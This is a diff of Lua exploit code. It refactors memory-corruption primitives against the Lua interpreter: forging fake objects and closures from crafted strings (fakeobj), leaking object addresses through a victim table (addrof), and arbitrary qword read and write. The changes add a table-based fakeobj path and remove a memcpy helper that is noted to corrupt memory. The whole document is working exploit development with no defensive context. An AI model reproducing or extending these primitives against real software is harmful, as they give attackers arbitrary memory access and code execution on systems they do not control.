@@ -110,14 +110,6 @@ function lua.create_str(str)
     return str, addr+24
 end
 
-function lua.fakeobj(fake_obj_addr, ttype)
-    local addr, fake_tvalues, fake_proto, fake_closure
-    fake_tvalues, addr = lua.create_str(ub8(fake_obj_addr) .. ub8(ttype))  -- value + ttype
-    fake_proto, addr = lua.create_str(ub8(0x0) .. ub8(0x0) .. ub8(addr))  -- next + tt/marked + k
-    fake_closure, _ = lua.create_str(ub8(0x0) .. ub8(addr))  -- env + proto
-    return lua.fakeobj_closure(fake_closure)
-end
-
 function lua.setup_initial_read_primitive()
     
     local fake_str_size = 0x100000001337
@@ -255,11 +247,10 @@ end
 
 -- setup a table where we can read its array buffer
 function lua.setup_victim_table()
-    assert(lua.fake_str)
-    local t = { 1, 2 }
+    local t = { 1, 2, 3, 4 }
     local array_addr = memory.read_qword(lua.addrof(t)+24)
     if array_addr then
-        if lua.read_buffer(array_addr, 1) then  -- test if we can read the buffer
+        if memory.read_buffer(array_addr, 1) then  -- test if we can read the buffer
             lua.tbl_victim, lua.tbl_victim_array_addr = t, array_addr
         end
     end
@@ -268,10 +259,25 @@ function lua.setup_victim_table()
     end
 end
 
-function lua.get_obj_value(obj)
+function lua.get_table_value(obj)
     if not lua.tbl_victim then return nil end
     lua.tbl_victim[1] = obj
     return memory.read_qword(lua.tbl_victim_array_addr)
+end
+
+function lua.fake_table_value(obj_addr, ttype)
+    if not lua.tbl_victim then return nil end
+    memory.write_qword(lua.tbl_victim_array_addr + 0x20, obj_addr)
+    memory.write_qword(lua.tbl_victim_array_addr + 0x28, ttype)
+    return lua.tbl_victim[3]
+end
+
+function lua.fakeobj_through_closure(obj_addr, ttype)
+    local addr, fake_tvalues, fake_proto, fake_closure
+    fake_tvalues, addr = lua.create_str(ub8(obj_addr) .. ub8(ttype))  -- value + ttype
+    fake_proto, addr = lua.create_str(ub8(0x0) .. ub8(0x0) .. ub8(addr))  -- next + tt/marked + k
+    fake_closure, _ = lua.create_str(ub8(0x0) .. ub8(addr))  -- env + proto
+    return lua.fakeobj_closure(fake_closure)
 end
 
 function lua.addrof_trivial(x)
@@ -280,7 +286,11 @@ function lua.addrof_trivial(x)
 end
 
 function lua.addrof(obj)
-    return lua.get_obj_value(obj) or lua.addrof_trivial(obj)
+    return lua.get_table_value(obj) or lua.addrof_trivial(obj)
+end
+
+function lua.fakeobj(obj_addr, ttype)
+    return lua.fake_table_value(obj_addr, ttype) or lua.fakeobj_through_closure(obj_addr, ttype)
 end
 
 function lua.read_buffer(addr, size)
@@ -318,21 +328,6 @@ function lua.write_qword(addr, value)
     value = uint64(value)
     lua.write_double(addr, string_to_double(ub8(value + setbit)))
     lua.write_double(addr+1, string_to_double(ub8(value:rshift(8) + setbit)))
-end
-
-function lua.write_multiple_qwords(addr, list)
-    for i,v in ipairs(list) do
-        lua.write_qword(addr+8*(i-1), list[i])
-    end
-end
-
--- copy memory from src to dest with 5 bytes corruption after dest+size
-function lua.memcpy(dest, src, size)
-    size = uint64(size):tonumber()
-    if size % 8 ~= 0 then
-        errorf("lua.memcpy() needs size to be aligned by 8 bytes (given %s)", hex(size))
-    end
-    lua.write_multiple_qwords(dest, memory.read_multiple_qwords(src, size / 8))
 end
 
 function lua.create_fake_cclosure(addr)
